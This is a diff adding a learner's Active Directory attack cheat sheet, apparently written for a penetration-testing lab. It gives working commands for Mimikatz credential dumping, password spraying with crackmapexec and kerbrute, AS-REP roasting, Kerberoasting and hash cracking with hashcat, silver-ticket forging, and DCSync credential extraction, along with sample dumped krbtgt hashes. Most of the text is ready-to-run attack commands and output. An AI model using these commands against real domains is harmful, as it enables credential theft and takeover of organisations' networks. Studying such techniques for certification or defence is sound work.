@@ -3012,3 +3012,189 @@ bloodhound
 can run find domain admin and find shortest path to domain admin
 
 need to mark user as owned
+
+reset neo4j for bloodhound
+```
+MATCH (n) OPTIONAL MATCH (n)-[r]-() DELETE n,r
+```
+
+for changing pw in AD, need full username
+
+```
+net user steve@corp.com Password123! /domain
+```
+
+### AD Authentication
+can use Mimikatz to extract domain hashes
+
+```
+privilege::debug
+sekurlsa::logonpasswords
+```
+
+ For AD instances at a functional level of Windows 2003, NTLM is the only available hashing algorithm. For instances running Windows Server 2008 or later, both NTLM and SHA-1 (a common companion for AES encryption) may be available
+
+
+A different approach and use of Mimikatz is to exploit Kerberos authentication by abusing TGT and service tickets. 
+
+can use mimikatz to view tickets
+```
+sekurlsa::tickets
+```
+
+### Password Attacks
+
+need to gather threshold before password lockout
+```
+net accounts
+```
+
+can do a slow password spray to enumerate credentials
+
+can also target SMB
+
+We can use crackmapexec4 on Kali to perform this kind of password spraying. We'll select smb as protocol and enter the IP address of any domain joined system such as CLIENT75 (192.168.50.75). 
+
+warning: SMB generates a lot of traffic
+
+```
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+
+crackmapexec added Pwn3d! to the output, indicating that dave has administrative privileges on the target system. I
+
+third kind of attack is based on TGT
+
+can use kerbrute for this
+```
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
+```
+
+I you receive a network error, make sure that the encoding of usernames.txt is ANSI. You can use Notepad's Save As functionality to change the encoding.
+
+### AS-REP Roasting
+By default, the AD user account option Do not require Kerberos preauthentication is disabled, meaning that Kerberos preauthentication is performed for all users. However, it is possible to enable this account option manually. I
+
+On Kali, we can use impacket-GetNPUsers3 to perform AS-REP roasting. We'll need to enter the IP address of the domain controller as an argument for -dc-ip, the name of the output file in which the AS-REP hash will be stored in Hashcat format for -outputfile, and -request to request the TGT.
+
+```
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
+```
+
+The result shows that hows that dave has the user account option Do not require Kerberos preauthentication enabled, meaning it's vulnerable to AS-REP Roasting.
+
+check AS-REP mode in hashcat
+```
+hashcat --help | grep -i "Kerberos"
+```
+
+```
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+can do a similar roasting on windows with rubeus
+
+if we're pre-authenicated we can just do a simple command
+```
+cd C:\Tools
+.\Rubeus.exe asreproast /nowrap
+```
+
+to get pre-auth disabled on windows, run PowerView
+```
+Get-DomainUser -PreauthNotRequired
+```
+
+if we have GenericWrite or GenericAll on another use, could disable Kerberos preauth then do AS-REP roasting.
+
+### Kerberoasting
+
+for windows we can use rubeus again
+```
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+then use hashcat again, this time we want TGS-REP
+```
+hashcat --help | grep -i "Kerberos"
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+on linux we use impack-GetUserSPNs
+
+```
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+sudo hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if the SPN runs in the context of a computer account, a managed service account,5 or a group-managed service account,6 the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. 
+
+Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions7 on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user,8 kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. 
+
+### Silver Tickets
+Privileged Account Certificate (PAC)1 validation2 is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller. Fortunately for this attack technique, service applications rarely perform PAC validation.
+
+In general, we need to collect the following three pieces of information to create a silver ticket:
+    SPN password hash
+    Domain SID
+    Target SPN
+
+Check if we have access to service
+```
+iwr -UseDefaultCredentials http://web04
+```
+if service has active session on our machine, use mimikatz to get NTLM hash
+
+now let's get SID of user
+```
+whoami /user
+```
+
+remember for SID to omit last 4 digits if we're interested in domain SID
+
+use kerberos::golden to gernerate ticket
+```
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+```
+
+use klist to view ticket
+```
+klist
+```
+
+can recheck our creds
+```
+iwr -UseDefaultCredentials http://web04
+```
+### Domain Controller Synchronization
+To launch synchronization attack, To launch such a replication, a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.
+
+can be done via mimikatz or linux
+example to get dave password
+
+```
+.\mimikatz.exe
+lsadump::dcsync /user:corp\dave
+```
+
+can use hashcat to crack the hash
+
+from linux we can do the same thing
+
+```
+impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
+
+if using impacket-secrets dump, output will look like this
+```
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::
+[*] Kerberos keys grabbed
+krbtgt:aes256-cts-hmac-sha1-96:e1cced9c6ef723837ff55e373d971633afb8af8871059f3451ce4bccfcca3d4c
+krbtgt:aes128-cts-hmac-sha1-96:8c5cf3a1c6998fa43955fa096c336a69
+krbtgt:des-cbc-md5:683bdcba9e7c5de9
+[*] Cleaning up...
+
+```
+
+we want the last part after NTDS.DIT secrets, before the three colons -> 1693c6cefafffc7af11ef34d1c788f47
